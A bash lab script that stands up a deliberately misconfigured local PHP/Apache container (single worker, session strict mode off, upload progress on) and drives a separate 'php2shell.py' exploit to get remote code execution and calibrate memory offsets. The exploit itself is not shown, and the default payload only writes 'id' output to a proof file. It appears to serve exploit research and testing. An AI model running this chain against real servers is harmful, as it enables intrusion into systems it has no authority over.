#!/usr/bin/env bash
# php2shell local lab - single-worker prefork + mod_php, the config the chain needs.
# usage:
#   ./lab.sh up [php_version]     # default 8.4.26
#   ./lab.sh rce [cmd] [version]
#   ./lab.sh calibrate LO:HI:STEP [version]
#   ./lab.sh down
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$HERE/lab-out
INI=$HERE/lab/php.ini
CONF=$HERE/lab/apache.conf
WWW=$HERE/lab/www
PORT=${PORT:-8088}
VER=${VER:-8.4.26}

mkdir -p "$OUT" "$WWW"
printf '<?php echo "OK\\n"; ?>\n' > "$WWW/index.php"
chmod 777 "$OUT"

cat > "$INI" <<'INI'
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
memory_limit = 8M
post_max_size = 64M
upload_max_filesize = 64M
session.save_path = "/tmp"
session.use_strict_mode = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
INI

cat > "$CONF" <<'CONF'
KeepAlive Off
<IfModule mpm_prefork_module>
    StartServers           1
    MinSpareServers        1
    MaxSpareServers        1
    MaxRequestWorkers      1
    ServerLimit            1
    MaxConnectionsPerChild 0
</IfModule>
CONF

case "${1:-}" in
  up)
    VER=${2:-$VER}
    docker rm -f php2shell-target >/dev/null 2>&1
    docker run -d --name php2shell-target -p 127.0.0.1:$PORT:80 \
      -v "$INI":/usr/local/etc/php/conf.d/zz.ini:ro \
      -v "$CONF":/etc/apache2/conf-enabled/zz.conf:ro \
      -v "$WWW":/var/www/html:ro \
      -v "$OUT":/out \
      "php:$VER-apache" sh -c 'chown -R www-data:www-data /out; exec apache2-foreground' >/dev/null
    sleep 5
    docker exec php2shell-target php -v | head -1
    docker exec php2shell-target sh -c 'apache2ctl -M 2>/dev/null | grep -E "mpm_prefork|php_module"; ps -C apache2 -o pid --no-headers | wc -l'
    curl -s -o /dev/null -w "target http=%{http_code}\n" http://127.0.0.1:$PORT/index.php
    ;;
  rce)
    CMD=${2:-'id>/out/p1'}
    rm -f "$OUT/p1"
    python3 "$HERE/php2shell.py" rce "http://127.0.0.1:$PORT/index.php" \
      --cmd "$CMD" --proof-file "$OUT/p1" --docker-container php2shell-target --attempts 3
    ;;
  calibrate)
    RANGE=${2:-0x68e00:0x69400:0x8}
    rm -f "$OUT/p1"
    python3 "$HERE/php2shell.py" calibrate "http://127.0.0.1:$PORT/index.php" \
      --cmd 'id>/out/p1' --proof-file "$OUT/p1" --docker-container php2shell-target --range "$RANGE"
    ;;
  down)
    docker rm -f php2shell-target >/dev/null 2>&1 && echo "lab removed"
    ;;
  *)
    sed -n '2,8p' "$0"
    ;;
esac
